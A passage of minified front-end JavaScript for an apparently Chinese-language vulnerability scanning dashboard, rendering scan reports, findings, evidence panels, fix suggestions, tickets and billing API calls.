8px;border-radius:2px;font-size:11px;font-weight:700">'+E(c)+"</span>"}else r==="missing_flags"?n=(Array.isArray(a)?a:[a]).map(function(p){return'<code style="background:rgba(240,167,50,0.1);color:#f0a732;padding:2px 8px;border-radius:2px;font-size:12px">'+E(p)+"</code>"}).join(" "):r==="status"||r==="days_left"?n='<span style="font-weight:600;color:var(--text-primary);font-size:12px">'+E(a)+"</span>":r==="snippet"?n='<code style="background:#1e293b;color:#e2e8f0;padding:6px 8px;border-radius:2px;font-size:11px;word-break:break-all;display:block;white-space:pre-wrap;max-height:160px;overflow:auto">'+E(a)+"</code>":n='<span style="font-size:12px;color:var(--text)">'+E(a)+"</span>";return'<div style="margin-bottom:8px"><span style="display:inline-block;min-width:80px;color:var(--text-secondary);font-size:12px;font-weight:600">'+o+"</span> "+n+"</div>"}).join("")+"</div>"}let si=[],zt=0;const Vn=3,Gn=2500;function M(e,i){si.push({msg:e,type:i}),$i()}function $i(){if(zt>=Vn||si.length===0)return;let e=si.shift();zt++;let i=document.getElementById("toast-container");if(!i){zt--;return}let t=document.createElement("div");t.className="toast";let s="ℹ️";e.type==="error"?s="[错误]":e.type==="success"?s="[成功]":e.type==="warn"&&(s="[警告]");let r=document.createElement("span");r.textContent=s+" ",r.style.marginRight="6px",t.appendChild(r),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),zt--,$i()},300)},Gn)}function Wi(e){return e?String(e).replace(/\/+$/,""):""}function Zi(){const e=[];return typeof window<"u"&&window.__CONFIG__&&window.__CONFIG__.api_base_url&&e.push(Wi(window.__CONFIG__.api_base_url)),typeof window<"u"&&(window.location.protocol==="http:"||window.location.protocol==="https:")&&e.push(""),e.push("http://127.0.0.1:8011"),[...new Set(e)]}Zi()[0];function Jn(e){return new Promise(function(i){setTimeout(i,e)})}function Xi(){try{return localStorage.getItem("vs_token")}catch{return null}}function Kn(){try{localStorage.removeItem("vs_token")}catch{}}function ve(){return!!Xi()}function Yn(){const e=Xi(),i={"Content-Type":"application/json"};return e&&(i.Authorization="Bearer "+e),i}async function ue(e,i={}){i.headers=Object.assign({},Yn(),i.headers||{});const t=!!i.skipAuthExpiry,s=Zi(),r=[];for(const n of s){const c=Wi(n),p=c?c+e:e;r.push(p),e.startsWith("/api/")&&!e.startsWith("/api/v1/")&&c&&r.push(c+"/api/v1"+e.slice(4))}let o=null,a=null;for(const n of r){let c=0;for(;c<2;)try{const p=await fetch(n,i);if(o=p,p.status===404&&r.length>1)break;if(p.status===401&&!t){Kn();try{localStorage.removeItem("vs_username")}catch{}throw new Error("登录状态已过期，请重新登录后再继续使用扫描功能")}return p}catch(p){if(a=p,c+=1,c<2){await Jn(250);continue}break}}if(o)return o;throw a&&a.message?new Error("无法连接扫描服务，请确认本地后端已启动"):new Error("无法连接扫描服务，请确认本地后端已启动")}async function Ze(e,i){const t=await ue(e,{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(i)}),s=await t.json().catch(()=>({}));return s&&typeof s=="object"&&(s._status=t.status,s._statusText=t.statusText),s}async function qe(e){const i=await ue(e),t=await i.json().catch(()=>({}));return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function Qn(e){const i=await ue(e,{method:"DELETE"}),t=await i.json().catch(()=>({}));return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function er(e,i){const t=await ue(e,{method:"PATCH",body:JSON.stringify(i)}),s=await t.json().catch(()=>({}));return s&&typeof s=="object"&&(s._status=t.status,s._statusText=t.statusText),s}function tr(){return qe("/api/config")}function ir(){return qe("/api/me/credits")}function nr(e=20,i=0){return qe("/api/usage?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}function rr(e){return Ze("/api/scan",e)}function sr(e){return Ze("/api/fix-tickets",e)}function or(e){return qe("/api/fix-tickets")}function ui(e,i){return er("/api/fix-tickets/"+e,i)}function Vi(e){return Qn("/api/fix-tickets/"+e)}function ar(e){return ue("/api/report/src-export",{method:"POST",body:JSON.stringify(e)})}function lr(e){return Ze("/api/finding/verify-reproduce",e)}function dr(e){return Ze("/api/finding/feedback",e)}function cr(){return qe("/api/billing/plans")}function pr(e){return Ze("/api/billing/order",e)}function ur(e){return qe("/api/billing/order/"+encodeURIComponent(e))}function fr(e=50,i=0){return qe("/api/billing/recharges?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}const gr=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),Ti={critical:0,high:1,medium:2,low:3,info:4},Gi={critical:"严重",high:"高危",medium:"中危",low:"低危",info:"信息"},Ji={critical:"high",high:"high",medium:"medium",low:"low",info:"info"};let $e=[],Nt=0,ot="generic",Me=null,fi="",Je=!1,Ki=0,Rt={total:0,fp_count:0};function hr(e){if(!e||!Array.isArray(e.findings)||e.findings.length===0)return!1;const i=e.findings[0];return i&&typeof i=="object"&&"id"in i&&"severity"in i&&"evidence"in i}function Yi(e){$e=yr(e.findings||[]),Nt=0,ot="generic",Je=!1,Me=e.scan_id||null,fi=e.url||"",Ki=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,Rt=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0,fp_count:0};const i=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,t=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0},s=e.risk_level||"未知",r=e.url||"",o=document.getElementById("result-content")||document.getElementById("result-container");if(!o){setTimeout(()=>Yi(e),0);return}let a="";a+=br(i,s,t,r,e),e.quality&&e.quality.overall_score!==void 0&&(a+=vr(e.quality,e.dedup_stats));const n=$e.length>0?$e[0]:null;a+='<div class="src-result-layout">',a+='<div class="src-result-sidebar">'+xr($e,Nt)+"</div>",a+='<div class="src-result-detail" id="src-detail-panel">'+gi(n)+"</div>",a+="</div>",o.innerHTML=a,_r(),mr()}function vr(e,i){const t=e.overall_score||0,s=t>=80?"#73c990":t>=60?"#f0a732":"#c75450",r=e.coverage_score||0,o=e.reliability_score||0,a=e.depth_score||0,n=e.recommendations||[],c=e.coverage_breakdown||{},p=e.reliability_breakdown||{},v=c.types_detected||[],d=i||{},f=d.original_count!==void 0?`<div class="src-quality-dedup">
         <span class="src-quality-label">去重统计</span>
         <span class="src-quality-stat">原始 ${d.original_count||0}</span>
         <span class="src-quality-arrow">→</span>
         <span class="src-quality-stat highlight">${d.deduplicated_count||0}</span>
         ${d.duplicate_count>0?`<span class="src-quality-tag">移除重复 ${d.duplicate_count}</span>`:""}
         ${d.correlation_groups>0?`<span class="src-quality-tag">关联组 ${d.correlation_groups}</span>`:""}
       </div>`:"",h=p.fp_rate!==void 0?(p.fp_rate*100).toFixed(0)+"%":"-",m=p.high_confidence_rate!==void 0?(p.high_confidence_rate*100).toFixed(0)+"%":"-";return`
    <div class="src-quality-panel" id="src-quality-panel">
      <div class="src-quality-header" id="src-quality-toggle">
        <div class="src-quality-score-wrap">
          <div class="src-quality-ring" style="border-color:${s}">
            <span style="color:${s};font-size:22px;font-weight:700">${t}</span>
          </div>
          <span class="src-quality-title">扫描可信度</span>
        </div>
        <div class="src-quality-bars">
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">覆盖度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${r}%;background:${r>=80?"#73c990":r>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${r}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">可靠性</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${o}%;background:${o>=80?"#73c990":o>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${o}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">深度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${a}%;background:${a>=80?"#73c990":a>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${a}</span>
          </div>
        </div>
        <button class="src-quality-expand" id="src-quality-expand-btn">展开</button>
      </div>
      <div class="src-quality-detail" id="src-quality-detail" style="display:none">
        <div class="src-quality-grid">
          <div class="src-quality-section">
            <div class="src-quality-section-title">覆盖说明</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>检测漏洞类型</span><code>${v.length} 种</code></div>
              <div class="src-quality-kv"><span>类型列表</span><code>${E(v.join(", ")||"-")}</code></div>
              <div class="src-quality-kv"><span>总发现数</span><code>${c.total_findings||0}</code></div>
            </div>
          </div>
          <div class="src-quality-section">
            <div class="src-quality-section-title">可信度与复核</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>误报率</span><code>${h}</code></div>
              <div class="src-quality-kv"><span>高置信度比例</span><code>${m}</code></div>
              <div class="src-quality-kv"><span>待复核数</span><code>${p.fp_count||0}</code></div>
              <div class="src-quality-kv"><span>高置信度数</span><code>${p.high_confidence_count||0}</code></div>
              <div class="src-quality-kv"><span>确认数</span><code>${c.confirmed_count||0}</code></div>
            </div>
          </div>
        </div>
        ${f}
        ${n.length>0?`
          <div class="src-quality-recommendations">
            <div class="src-quality-section-title">建议</div>
            <ul class="src-quality-rec-list">
              ${n.map(g=>`<li>${E(g)}</li>`).join("")}
            </ul>
          </div>
        `:""}
      </div>
    </div>
  `}function mr(){const e=document.getElementById("src-quality-toggle"),i=document.getElementById("src-quality-detail"),t=document.getElementById("src-quality-expand-btn");!e||!i||!t||(e.addEventListener("click",function(s){if(s.target===t)return;const r=i.style.display!=="none";i.style.display=r?"none":"block",t.textContent=r?"查看明细":"收起"}),t.addEventListener("click",function(s){s.stopPropagation();const r=i.style.display!=="none";i.style.display=r?"none":"block",t.textContent=r?"查看明细":"收起明细"}))}function yr(e){return e.slice().sort((i,t)=>{const s=Ai(i.verification_status),r=Ai(t.verification_status);if(s!==r)return s-r;const o=i.is_likely_fp?1:0,a=t.is_likely_fp?1:0;if(o!==a)return o-a;const n=Ti[(i.severity||"").toLowerCase()]??99,c=Ti[(t.severity||"").toLowerCase()]??99;return n!==c?n-c:(t.severity_score||0)-(i.severity_score||0)})}function Ai(e){const i=String(e||"").toLowerCase();return i==="confirmed"?0:i==="probable"?1:i==="suspected"?2:3}function br(e,i,t,s,r){const o=Pt(e);jt(e);const a=qi(i),n=r.duration_ms?`<span class="meta-item">耗时 ${r.duration_ms}ms</span>`:"",c=r.scan_id?`<span class="meta-item">扫描 #${r.scan_id}</span>`:"",p=r.report_share_id?`<span class="meta-item">报告 ${E(r.report_share_id)}</span>`:"",v=r.scan_id&&ve()?'<button class="src-export-btn" id="src-export-markdown" title="导出 SRC 格式 Markdown 报告">导出 SRC 报告</button>':"",f=(r.quality||{}).overall_score||0,h=f>0?`<span class="meta-item" style="color:${f>=80?"#73c990":f>=60?"#f0a732":"#c75450"}">质量 ${f}分</span>`:"",m=r.verification_stats||{},g=m.enabled?`<span class="meta-item verification-badge">
        <span class="v-confirmed" title="已验证">${m.confirmed||0}</span>
        <span class="v-probable" title="可疑">${m.probable||0}</span>
        <span class="v-suspected" title="待人工复核">${m.suspected||0}</span>
       </span>`:"",y=t.total||0,b=t.fp_count||0,k=Math.max(0,y-b),x=t.critical||0,I=t.high||0,z=t.medium||0,R=t.low||0,O=t.info||0,j=x+I>0?"优先关闭高危暴露面，再安排复测确认修复是否生效。":z>0?"先处理中危项，再复扫验证修复是否生效。":"当前结果偏健康，可作为客户基线留存并持续监控。",P="共发现 "+y+" 项问题，其中 "+k+" 项建议优先处理。",N="本报告用于客户沟通、复测留档和交付。",Y=r.scan_id?'<div class="src-report-action-hint src-report-action-hint-alert">优先处理已确认项，再复核可疑项。</div>':"";return`
    <div class="src-report-header fade-in-up">
      <div class="src-score-wrap">
        <div class="src-score-ring" style="background:${o};color:#fff">
          <div class="src-score-value">${e}</div>
          <div class="src-score-label">安全评分</div>
        </div>
      </div>
      <div class="src-report-meta">
        <div class="src-report-title-row">
          <span class="risk-badge ${a}">${E(i)}</span>
          <span class="src-report-url">${E(s)}</span>
        </div>
        <div class="src-report-stats">
          <div class="src-stat critical"><div class="num">${x}</div><div class="label">严重</div></div>
          <div class="src-stat high"><div class="num">${I}</div><div class="label">高危</div></div>
          <div class="src-stat medium"><div class="num">${z}</div><div class="label">中危</div></div>
          <div class="src-stat low"><div class="num">${R}</div><div class="label">低危</div></div>
          <div class="src-stat info"><div class="num">${O}</div><div class="label">信息</div></div>
          <div class="src-stat total"><div class="num">${y}</div><div class="label">总计</div></div>
          <div class="src-stat" style="background:rgba(115,201,144,0.08)"><div class="num" style="color:#73c990">${k}</div><div class="label">待处理</div></div>
        </div>
        <div class="src-report-submeta">
          ${c}${n}${p}${h}${g}
          <span class="meta-item">发现于 ${Wt(r.discovered_at||new Date().toISOString())}</span>
        </div>
        <div class="src-report-actions">
          ${v}
          <button class="src-export-btn" id="src-copy-summary" title="复制当前报告摘要">复制摘要</button>
        </div>
        <div class="src-report-summary">${E(P)}</div>
        <div class="src-report-intro">${E(N)}</div>
        <div class="src-report-exec-summary">
          <div class="src-report-exec-title">概览</div>
          <div class="src-report-exec-text">结果已按风险、验证状态和可信度整理，可直接用于确认修复优先级、复测范围和交付附件。</div>
        </div>
        <div class="src-report-next-step">
          <div class="src-report-next-step-title">建议</div>
          <div class="src-report-next-step-text">${E(j)}${b>0?" 已识别 "+b+" 项可疑结果，默认优先显示可信项。":""}</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
            <button class="src-filter-btn" onclick="navigateTo('tickets')">工单</button>
            <button class="src-filter-btn" onclick="navigateTo('fixer')">修复</button>
          </div>
          ${Y}
        </div>
      </div>
    </div>
  `}function xr(e,i){let t=Je?e.filter(o=>!o.is_likely_fp):e,s=e.length-t.length,r='<div class="src-list-header">结果列表 <span class="src-list-count">'+t.length+"</span>";return r+='<button class="src-filter-btn" data-action="toggle-fp-filter" title="切换可疑项显示">'+(Je?"显示全部":"优先可信项")+"</button>",s>0&&(r+='<span class="src-filter-note">已隐藏 '+s+" 项</span>"),r+="</div>",r+='<div class="src-list-items">',e.length===0?r+='<div class="src-empty">'+(Je?"筛选下没有结果":"暂无结果")+"</div>":t.forEach((o,a)=>{const n=(o.severity||"info").toLowerCase(),c=Ji[n]||"info",p=a===i?"active":"",v=o.parameter?`<code class="src-list-param">${E(o.parameter)}</code>`:"",d=o.type?`<span class="src-list-type">${E(o.type.toUpperCase())}</span>`:"",f=o.url?new URL(o.url,window.location.href).hostname:"",h=o.url?new URL(o.url,window.location.href).pathname:"",m=o.is_likely_fp?'<span class="src-list-fp-tag src-list-fp-tag-alert" title="待复核">待人工复核</span>':"",g=o.correlation_group?`<span class="src-list-corr" title="关联组 ${be(o.correlation_group)}（${o.correlation_size||0} 个相关）">${E(o.correlation_group)}</span>`:"",y=o.merged_count>1?`<span class="src-list-merged" title="合并了 ${o.merged_count} 个重复项">×${o.merged_count}</span>`:"",b=o.verification_status,k=b==="confirmed"?'<span class="src-list-v confirmed" title="已验证">✓</span>':b==="probable"?'<span class="src-list-v probable" title="可能存在">?</span>':b==="suspected"?'<span class="src-list-v suspected" title="待人工复核">!</span>':"",x=o.user_feedback?o.user_feedback.is_false_positive?'<span class="src-list-fb fp" title="已标记误报">误报</span>':'<span class="src-list-fb confirmed" title="已确认">确认</span>':"",I=String(o.adjusted_confidence||o.confidence||"medium"),z=I==="high"?"高可信":I==="medium"?"中可信":I==="low"?"低可信":I;r+=`
        <div class="src-list-item ${p} ${c}" data-index="${a}">
          <div class="src-list-row top">
            <span class="src-sev-badge ${c}">${Gi[n]}</span>
            <span class="src-list-title" title="${be(o.title||"")}">${E(o.title||"未命名漏洞")}</span>
            ${k}${x}${m}${y}
          </div>
          <div class="src-list-row meta">
            ${d}
            ${v}
            <span class="src-list-host" title="${be(o.url||"")}">${E(f)}${E(h)}</span>
            <span class="src-list-confidence ${E(I)}">${E(z)}</span>
            ${g}
          </div>
        </div>
      `}),r+="</div>",r}function gi(e,i){if(!e)return'<div class="src-empty-detail">从左侧选择一项查看证据和建议</div>';const t=(e.severity||"info").toLowerCase(),s=Ji[t]||"info",r=Gi[t]||"信息",o=e.evidence||{},a=e.location_detail||{},n={open:"待处理",confirmed:"已确认",false_positive:"误报",fixed:"已修复"},c=e.status||"open";let p='<div class="src-detail-card fade-in-up">';if(p+=`<div class="src-detail-header">
    <div class="src-detail-title-row">
      <span class="src-detail-severity ${s}">${r}</span>
      <h2 class="src-detail-title">${E(e.title||"未命名漏洞")}</h2>
      <span class="src-detail-status ${c}">${n[c]||c}</span>
    </div>
    <div class="src-detail-subtitle">
      <code class="src-detail-id">${E(e.id||"")}</code>
      <span class="src-detail-type">${E(e.type||"").toUpperCase()}</span>
      ${e.cwe_id?`<span class="src-detail-cwe" title="Common Weakness Enumeration">${E(e.cwe_id)}</span>`:""}
      ${e.owasp_category?`<span class="src-detail-owasp">${E(e.owasp_category)}</span>`:""}
      ${e.cvss_score?`<span class="src-detail-cvss" title="${E(e.cvss_vector||"")}">CVSS ${e.cvss_score}</span>`:""}
      ${e.severity_score?`<span class="src-detail-score">评分 ${e.severity_score}/10</span>`:""}
      <span class="src-detail-confidence">置信度 ${E(e.adjusted_confidence||e.confidence||"medium")}</span>
      ${e.verification_status?`<span class="src-detail-verify-badge ${e.verification_status}">${e.verification_status==="confirmed"?"已验证":e.verification_status==="probable"?"可能存在":"待人工复核"}</span>`:""}
      ${e.is_likely_fp?'<span class="src-detail-fp-badge src-detail-fp-badge-alert">待人工复核</span>':""}
      ${e.user_feedback?e.user_feedback.is_false_positive?'<span class="src-detail-fp-badge" title="您误报">已标记误报</span>':'<span class="src-detail-verify-badge verified" title="您已确认">您已确认</span>':""}
    </div>
  </div>`,p+=`<div class="src-detail-tabs">
    <button class="src-detail-tab active" data-tab="overview">概览</button>
    <button class="src-detail-tab" data-tab="evidence">请求 / 响应</button>
    <button class="src-detail-tab" data-tab="fix">修复</button>
  </div>`,p+='<div class="src-detail-panel active" data-panel="overview">',e.fp_score!==void 0||e.verification_score!==void 0||e.fp_reasons&&e.fp_reasons.length>0){if(p+=`<div class="src-detail-section">
      <div class="src-section-title">可信度判断</div>
      <div class="src-section-body">`,e.fp_score!==void 0){const m=(e.fp_score*100).toFixed(0),g=e.fp_score>=.5?"#c75450":e.fp_score>=.3?"#f0a732":"#73c990";p+=`<div class="src-kv"><span class="src-k">误报概率</span><span class="src-v" style="color:${g}">${m}%</span></div>`}if(e.verification_score!==void 0){const m=e.verification_score>=80?"#73c990":e.verification_score>=60?"#f0a732":"#c75450";p+=`<div class="src-kv"><span class="src-k">验证得分</span><span class="src-v" style="color:${m}">${e.verification_score}/100</span></div>`}e.verification_techniques&&e.verification_techniques.length>0&&(p+=`<div class="src-kv"><span class="src-k">验证技术</span><span class="src-v">${E(e.verification_techniques.join(", "))}</span></div>`),e.fp_reasons&&e.fp_reasons.length>0&&(p+=`<div class="src-fp-reasons"><ul>${e.fp_reasons.map(m=>`<li>${E(m)}</li>`).join("")}</ul></div>`),p+="</div></div>"}p+=`<div class="src-detail-section">
    <div class="src-section-title">漏洞描述</div>
    <div class="src-section-body">${E(e.description||"暂无描述")}</div>
  </div>`,p+=`<div class="src-detail-section">
    <div class="src-section-title">实际影响</div>
    <div class="src-section-body">${E(e.impact||"暂无影响说明")}</div>
  </div>`,p+=`<div class="src-detail-section">
    <div class="src-section-title">精准位置</div>
    <div class="src-section-body">
      <div class="src-kv"><span class="src-k">URL</span><code class="src-v">${E(a.url||e.url||"")}</code></div>
      ${a.method?`<div class="src-kv"><span class="src-k">方法</span><code class="src-v">${E(a.method)}</code></div>`:""}
      ${a.parameter||e.parameter?`<div class="src-kv"><span class="src-k">参数</span><code class="src-v">${E(a.parameter||e.parameter)}</code></div>`:""}
      ${a.parameter_type?`<div class="src-kv"><span class="src-k">参数类型</span><code class="src-v">${E(a.parameter_type)}</code></div>`:""}
      ${a.code_location?`<div class="src-kv"><span class="src-k">代码位置</span><code class="src-v">${E(a.code_location)}</code></div>`:""}
      ${a.snippet?`<div class="src-kv"><span class="src-k">上下文</span><span class="src-v">${E(a.snippet)}</span></div>`:""}
      ${!a.url&&e.location?`<div class="src-kv"><span class="src-k">位置</span><span class="src-v">${E(e.location)}</span></div>`:""}
    </div>
  </div>`,Array.isArray(e.reproduce_steps)&&e.reproduce_steps.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">复现步骤</div>
      <ol class="src-repro-steps">`,e.reproduce_steps.forEach(m=>{p+=`<li>${E(m)}</li>`}),p+="</ol></div>"),p+="</div>",p+='<div class="src-detail-panel" data-panel="evidence">',p+=wr(o,e),p+="</div>",p+='<div class="src-detail-panel" data-panel="fix">';const v=e.fix_suggestion||"暂无建议",d=v.split(/\n+/).map(m=>m.trim()).filter(Boolean),f=d[0]||"暂无建议",h=d.slice(1,4);return p+=`<div class="src-detail-section">
    <div class="src-section-title">修复结论</div>
    <div class="src-section-body">
      <div style="font-weight:700;margin-bottom:6px;color:var(--text-primary)">${E(f)}</div>
      <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">${E(v)}</div>
    </div>
  </div>`,h.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">执行步骤</div>
      <div class="src-section-body"><ol style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">`,h.forEach(m=>{p+=`<li>${E(m)}</li>`}),p+="</ol></div></div>"),p+=`<div class="src-detail-section">
    <div class="src-section-title">修复完成后的检查</div>
    <div class="src-section-body"><ul style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">
      <li>重新扫描同一地址，确认对应漏洞已消失。</li>
      <li>核对安全头、Cookie、重定向或页面响应是否符合预期。</li>
      <li>如果为高危项，建议先在测试环境验证再发布到生产。</li>
    </ul></div>
  </div>`,p+=kr(e.fix_code||{}),p+="</div>",Array.isArray(e.references)&&e.references.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">参考资料</div>
      <ul class="src-references">`,e.references.forEach(m=>{p+=`<li><a href="${be(m)}" target="_blank" rel="noopener">${E(m)}</a></li>`}),p+="</ul></div>"),Me&&ve()&&(p+=`<div class="src-detail-actions">
      <button class="src-action-btn verify" data-action="verify" data-finding-id="${be(e.id||"")}" title="重新请求目标并尝试验证是否仍可复现">验证复现</button>
      <button class="src-action-btn false-positive" data-action="fp" data-finding-id="${be(e.id||"")}" title="如果你判断该项不是实际漏洞，可标记为误报或观察项">标记误报</button>
      <button class="src-action-btn confirm" data-action="confirm" data-finding-id="${be(e.id||"")}" title="如果你确认该项真实存在，可标记为有效漏洞并进入修复流程">确认有效</button>
      <button class="src-action-btn ticket" data-action="ticket" data-finding-id="${be(e.id||"")}" title="将该漏洞转为修复工单并跟踪处理">工单</button>
    </div>`),p+=`<div class="src-detail-footer">
    <span>发现时间：${Wt(e.discovered_at||"")}</span>
  </div>`,p+="</div>",p}function wr(e,i){const t=!!e.request,s=!!e.response,r=!!e.payload,o=!!e.screenshot,a=!!e.notes,n=!!e.matched_signature,c=Bi(e.request),p=Bi(e.response);let v='<div class="src-detail-section">';(r||n||a)&&(v+=`<div class="src-section-title">命中信息</div>
    <div class="src-section-body src-evidence-meta">`,r&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">Payload</span>
        <code class="src-payload">${E(e.payload)}</code>
        <button class="src-copy-btn" data-copy="${be(e.payload)}">复制</button>
      </div>`),n&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">命中签名</span>
        <code class="src-signature">${E(e.matched_signature)}</code>
      </div>`),a&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">备注</span>
        <span>${E(e.notes)}</span>
      </div>`),v+="</div>"),v+=`<div class="src-section-title">证据</div>
    <div class="src-section-body src-evidence-meta">`;const d=i.verification_status||(i.is_likely_fp?"suspected":"probable"),f=d==="confirmed"?"已验证":d==="probable"?"可能存在":"待人工复核",h=e.location||e.position||e.selector||e.header||e.parameter||e.path||e.url||"";return v+=`<div class="src-evidence-row"><span class="src-evidence-label">可信度</span><span>${E(f)}</span></div>`,h&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">命中位置</span><span>${E(h)}</span></div>`),v+=`<div class="src-evidence-row"><span class="src-evidence-label">误报概率</span><span>${i.fp_score!==void 0?(i.fp_score*100).toFixed(0)+"%":"—"}</span></div>`,c&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">请求摘要</span><span>${E(c)}</span></div>`),p&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">响应摘要</span><span>${E(p)}</span></div>`),v+="</div>",(t||s)&&(v+=`<div class="src-section-title">HTTP 流量</div>
    <div class="src-traffic-viewer">`,t&&(v+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>请求</span>
          <button class="src-copy-btn" data-copy="${be(e.request)}">复制</button>
        </div>
        <pre><code>${E(e.request)}</code></pre>
      </div>`),s&&(v+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>响应</span>
          <button class="src-copy-btn" data-copy="${be(e.response)}">复制</button>
        </div>
        <pre><code>${E(e.response)}</code></pre>
      </div>`),v+="</div>"),o&&(v+=`<div class="src-screenshot-row">
      <span class="src-evidence-label">截图</span>
      <img src="${be(e.screenshot)}" alt="证据截图" loading="lazy">
    </div>`),!t&&!s&&!r&&!o&&!a&&!n&&(v+=`<div class="src-section-title">证据</div>
    <div class="src-section-body"><div class="src-no-evidence">无详细技术证据</div></div>`),v+="</div>",v}function Bi(e){if(!e)return"";const i=String(e).split(/\r?\n/).map(n=>n.trim()).filter(Boolean);if(!i.length)return"";const t=i.find(n=>/^HTTP\/\d/i.test(n)),s=i.find(n=>/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+/i.test(n)),r=s?s.split(/\s+/).slice(0,2).join(" "):"",o=i.filter(n=>/^[A-Za-z0-9\-]+:\s*/.test(n)).slice(0,3),a=[];return t&&a.push(t.replace(/^HTTP\/\d\.\d\s*/i,"HTTP ")),r&&a.push(r),o.length&&a.push(o.join(" | ")),a.join(" · ").slice(0,220)}function kr(e){const t=[{key:"nginx",label:"Nginx"},{key:"apache",label:"Apache"},{key:"express",label:"Express"},{key:"flask",label:"Flask"},{key:"spring_boot",label:"Spring Boot"},{key:"cloudflare",label:"Cloudflare"},{key:"generic",label:"通用"}].filter(r=>e[r.key]);if(t.length===0)return"";let s=`<div class="src-detail-section">
    <div class="src-section-title">修复代码</div>
    <div class="src-fix-tabs">`;return t.forEach(r=>{const o=r.key===ot?"active":"";s+=`<button class="src-fix-tab ${o}" data-tab="${r.key}">${r.label}</button>`}),s+="</div>",t.forEach(r=>{const o=r.key===ot?"active":"hidden";s+=`<div class="src-fix-panel ${o}" data-panel="${r.key}">
      <pre><code>${E(e[r.key])}</code></pre>
      <button class="src-copy-btn" data-copy="${be(e[r.key])}">复制代码</button>
    </div>`}),s+="</div>",s}function _r(){const e=document.getElementById("result-content")||document.getElementById("result-container");!e||e.dataset.srcResultBound==="1"||(e.dataset.srcResultBound="1",e.addEventListener("click",function(i){const t=i.target.closest(".src-list-item");if(t){const p=parseInt(t.dataset.index,10);Ir(p);return}const s=i.target.closest(".src-detail-tab");if(s){const p=s.dataset.tab,v=s.closest(".src-detail-card");if(!v)return;v.querySelectorAll(".src-detail-tab").forEach(d=>d.classList.remove("active")),s.classList.add("active"),v.querySelectorAll(".src-detail-panel").forEach(d=>{d.classList.toggle("active",d.dataset.panel===p)});return}const r=i.target.closest(".src-fix-tab");if(r){ot=r.dataset.tab,document.querySelectorAll(".src-fix-tab").forEach(p=>p.classList.remove("active")),r.classList.add("active"),document.querySelectorAll(".src-fix-panel").forEach(p=>{p.classList.toggle("active",p.dataset.panel===ot),p.classList.toggle("hidden",p.dataset.panel!==ot)});return}const o=i.target.closest(".src-copy-btn");if(o){const p=o.dataset.copy||"";yt(p).then(()=>M("已复制到剪贴板"));return}const a=i.target.closest(".src-export-btn");if(a){a.id==="src-copy-summary"?Sr():Er();return}const n=i.target.closest(".src-filter-btn");if(n&&n.dataset.action==="toggle-fp-filter"){Je=!Je;const p=Je?$e.filter(d=>!d.is_likely_fp):$e;Nt=0;const v=document.getElementById("src-detail-panel");v&&(v.innerHTML=gi(p[0]));return}i.target.closest(".src-action-btn")&&zr(i)}))}async function Sr(){if(!Me)return;const i=Array.from(document.querySelectorAll(".finding-card")).slice(0,3).map((r,o)=>{const a=r.querySelector(".finding-title"),n=r.querySelector(".finding-severity");return`${o+1}. ${a?a.textContent.trim():"未命名项"}${n?`（${n.textContent.trim()}）`:""}`}).filter(Boolean),t=Math.max(0,(Rt.total||0)-(Rt.fp_count||0)),s=["报告摘要","扫描 ID: "+Me,"URL: "+fi,"安全评分: "+Ki,"总计: "+(Rt.total||0),"待处理: "+t,i.length?`重点项:
`+i.join(`
`):"重点项: 无","建议: 优先处理高危和严重项，修复后复测。"].join(`
